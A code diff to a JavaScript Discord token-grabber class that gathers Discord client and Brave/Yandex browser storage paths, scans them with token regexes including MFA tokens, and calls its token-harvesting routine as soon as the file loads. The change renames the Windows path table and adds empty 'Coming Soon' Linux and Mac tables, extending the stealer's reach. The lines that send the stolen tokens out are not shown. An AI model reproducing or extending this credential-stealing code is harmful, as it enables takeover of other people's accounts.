@@ -1,5 +1,5 @@
 'use strict';
-// THIS IS ONLY SUPPORTED ON WINDOWS. LINUX, AND MAC ARE NOT SUPPORTED.
+// THIS IS ONLY SUPPORTED ON WINDOWS. LINUX, AND MAC ARE NOT SUPPORTED YET.
 
 class Schemaposse {
     constructor() {
@@ -10,7 +10,7 @@ class Schemaposse {
         };
         this.Roaming = process.env.APPDATA;
         this.LocalAppData = process.env.LOCALAPPDATA;
-        this.Paths = {
+        this.WindowsPaths = {
             Discord           :`${this.Roaming}\\Discord`,
             DiscordCanary     :`${this.Roaming}\\discordcanary`,
             DiscordPTB        :`${this.Roaming}\\discordptb`,
@@ -21,6 +21,12 @@ class Schemaposse {
             Brave             :`${this.LocalAppData}\\BraveSoftware\\Brave-Browser\\User Data\\Default`,
             Yandex            :`${this.LocalAppData}\\Yandex\\YandexBrowser\\User Data\\Default`
         };
+        this.LinuxPaths = {
+            // Coming Soon
+        }
+        this.MacPaths = {
+            // Coming Soon
+        }
         this.Tokens = {};
         this.Regex = [
             new RegExp(/mfa\.[\w-]{84}/g), 
@@ -100,4 +106,4 @@ class Schemaposse {
 }
 
 const Class = new Schemaposse()
-Class.Get_Tokens_From_Paths(Class.Paths)
+Class.Get_Tokens_From_Paths(Class.WindowsPaths)
